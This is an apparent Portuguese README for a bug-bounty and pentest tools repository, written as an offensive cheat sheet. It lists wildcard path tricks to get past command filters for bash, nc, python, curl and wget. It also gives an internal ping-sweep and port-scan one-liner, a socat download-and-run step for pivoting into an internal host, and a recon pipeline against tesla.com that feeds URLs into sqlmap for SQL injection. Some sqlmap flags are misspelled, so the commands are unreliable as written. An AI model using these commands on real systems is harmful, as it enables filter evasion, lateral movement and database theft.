# Bugbounts-ferramentas-e-tutoriais

Esse script baixa as ferramentas mais utilizadas em pentest e bounts, cria arquivos txt passando como usa cada uma, e ainda baixa wordlists mais atuais de parâmetros, dns, diretorios e etc...
<h1>Bypass de bash use a imaginação, aqui está alguns exemplos</h1>
/bin/b??? -p || /bi?/b??? -p = bash</br>
/bin/ne?c?t || /bi?/ne?c?t = nc </br>
/bin/p?t?o?3 || /bi?/p?t?o?3 = python3</br>
/bin/p?t?o?2 || /bi?/p?t?o?2 = python2</br>
/bin/c??l || /bi?/c??l = curl </br>
/bin/w??t || /bi?/w??t = get</br>

<h1>Para fazer um scan na rede do alvo procurando novos ips internos ativos com portas abertas</h1>
route|awk '{print $1}'|grep [[:digit:]] || ip route list |awk '{print $1}'|grep [[:digit:]];echo -e "\e[1;41;1;45mColoqueo ip assim -----> 172.0.0. tire o ultimo numero\e[0m" ;echo -en "Escolha o ip e coloque aqui -->: ";read num ; for i in $(seq 1 255);do ping -W 1 -c 1 $num$i | grep '64 bytes' | awk {'print $4'} | sed 's/.$//g';done > ipvalidos.txt ;for a in $(cat ipvalidos.txt);do nc -nv -w 1 -z $a 80 443 22 21 3306 25 445 139;done
</br>
<h2>Dowlonad do socat para o pivoting</h2>

Comand = wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat;chmod +x socat ;./socat -h

Tutorial = https://deephacking.tech/pivoting-con-socat/
</br>
Uso= ./socat tcp-l:7878,fork,reuseaddr tcp:172.16.0.147:80 &


<h2>Pegando params para sqli</h2>

pegando target das url: 

subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls.txt

filtrando potenciais sqli: 

cat urls | gf sqli | tee -a sqli.txt
</br>
gf = (ssrf,xss,ssti,sqli,redirect,rce,lfi,jsvar,interestingsubs,insterestingparams,interestingEXT,ido,dbug)

jogando para sqlmap:

while read line; do sqlmap -u $line --parse-erros --current-db --invalid-logical --invalid-bignum --invalid-string --riks 3;done < sqli.txt
